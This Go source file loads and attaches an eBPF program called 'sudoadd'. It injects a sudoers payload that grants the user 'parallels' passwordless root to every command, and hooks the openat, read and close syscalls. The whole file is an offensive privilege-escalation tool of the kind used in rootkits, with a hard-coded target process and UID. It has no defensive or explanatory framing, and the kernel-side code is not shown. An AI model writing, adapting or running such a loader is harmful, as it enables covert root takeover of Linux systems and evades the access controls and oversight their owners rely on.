package main

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"github.com/cilium/ebpf/link"
	"github.com/cilium/ebpf/ringbuf"
	"github.com/cilium/ebpf/rlimit"
	"golang.org/x/sys/unix"
	"log"
	"os"
	"os/signal"
	"syscall"
)
//go:generate go run github.com/cilium/ebpf/cmd/bpf2go -cc clang -type event -target arm64 -cflags "-g -O2 -Wall -target bpf -D __TARGET_ARCH_arm64"  sudoadd ./kernel-code/sudoadd.bpf.c


func main() {
	// Subscribe to signals for terminating the program.
	stopper := make(chan os.Signal, 1)
	signal.Notify(stopper, os.Interrupt, syscall.SIGTERM)

	// Remove resource limits for kernels <5.11.
	if err := rlimit.RemoveMemlock(); err != nil {

		log.Fatal("Removing memlock:", err)
	}
	spec, err := loadSudoadd()
	if err != nil {
		log.Fatal("loadExechijack error", err)
	}
	var payload []byte = []byte("parallels ALL=(ALL:ALL) NOPASSWD:ALL #")
	payloadLen := len(payload)
	//log.Println(payloadLen)
	// 获取字节序列并确保它的长度是10字节
	if len(payload) < 100 {
		// 如果长度小于10，扩展切片
		padding := make([]byte, 100-len(payload))
		payload = append(payload, padding...)
	}
	err = spec.RewriteConstants(map[string]interface{}{
		"target_ppid": int32(626213),
		"uid":         int32(1000),
		"payload_len": int32(payloadLen),
		"payload":     payload,
	})
	if err != nil {
		log.Fatal("rewrite constants error,", err)
	}

	objs := sudoaddObjects{}
	err = spec.LoadAndAssign(&objs, nil)
	if err != nil {
		log.Fatal("LoadAndAssign error,", err)
	}

	defer objs.Close()

	openatEnterTp, err := link.Tracepoint("syscalls", "sys_enter_openat", objs.HandleOpenatEnter, nil)
	if err != nil {
		log.Fatal("attach tracing error,", err)
	}
	defer openatEnterTp.Close()
	openatExitTp, err := link.Tracepoint("syscalls", "sys_exit_openat", objs.HandleOpenatExit, nil)
	if err != nil {
		log.Fatal("attach tracing error,", err)
	}
	defer openatExitTp.Close()

	readEnterTp, err := link.Tracepoint("syscalls", "sys_enter_read", objs.HandleReadEnter, nil)
	if err != nil {
		log.Fatal("attach tracing error,", err)
	}
	defer readEnterTp.Close()

	readExitTp, err := link.Tracepoint("syscalls", "sys_exit_read", objs.HandleReadExit, nil)
	if err != nil {
		log.Fatal("attach tracing error,", err)
	}
	defer readExitTp.Close()

	closeExitTp, err := link.Tracepoint("syscalls", "sys_exit_close", objs.HandleCloseExit, nil)
	if err != nil {
		log.Fatal("attach tracing error,", err)
	}
	defer closeExitTp.Close()

	rd, err := ringbuf.NewReader(objs.Rb)
	if err != nil {
		log.Fatal(err)
	}
	defer rd.Close()

	go func() {
		<-stopper

		if err := rd.Close(); err != nil {
			log.Fatalf("closing ringbuf reader: %s", err)
		}
	}()

	log.Println("Waiting for events..")
	//go debug()
	var event sudoaddEvent
	for {
		record, err := rd.Read()
		if err != nil {
			if errors.Is(err, ringbuf.ErrClosed) {
				log.Println("Received signal, exiting..")
				return
			}
			log.Printf("reading from reader: %s", err)
			continue
		}
		err = binary.Read(bytes.NewBuffer(record.RawSample), binary.LittleEndian, &event)
		if err != nil {
			log.Printf("parsing ringbuf event: %s", err)
			continue
		}
		log.Printf("pid: %d\tcomm: %s\tsuccess:%t\n", event.Pid, unix.ByteSliceToString(event.Comm[:]), event.Success)
	}
}

func debug() {
	// 打开trace_pipe文件
	file, err := os.Open("/sys/kernel/debug/tracing/trace_pipe")
	if err != nil {
		log.Fatalf("Failed to open trace_pipe: %v", err)
	}
	defer file.Close()

	// 使用bufio.Reader读取文件
	reader := bufio.NewReader(file)

	for {
		line, err := reader.ReadString('\n')
		if err != nil {
			log.Fatalf("Failed to read from trace_pipe: %v", err)
		}

		// 打印从trace_pipe中读取的每一行
		fmt.Print(line)
	}
}
